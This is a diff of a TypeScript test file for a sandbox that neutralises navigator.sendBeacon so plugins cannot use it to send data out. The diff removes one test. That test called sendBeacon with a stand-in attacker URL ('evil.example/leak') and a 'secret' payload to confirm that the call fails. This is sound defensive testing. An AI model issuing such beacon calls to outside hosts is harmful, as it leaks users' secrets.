@@ -18,11 +18,6 @@ function load(): { sendBeacon?: (...args: unknown[]) => boolean } {
 	return navigator;
 }
 
-test("sendBeacon is replaced by a function that always reports failure", () => {
-	const navigator = load();
-	expect(navigator.sendBeacon?.("https://evil.example/leak", "secret")).toBe(false);
-});
-
 test("a later assignment cannot restore a working sendBeacon", () => {
 	// The setter is a no-op and the getter hands back a fresh failing stub every time, so a
 	// plugin overwriting the property gains nothing.
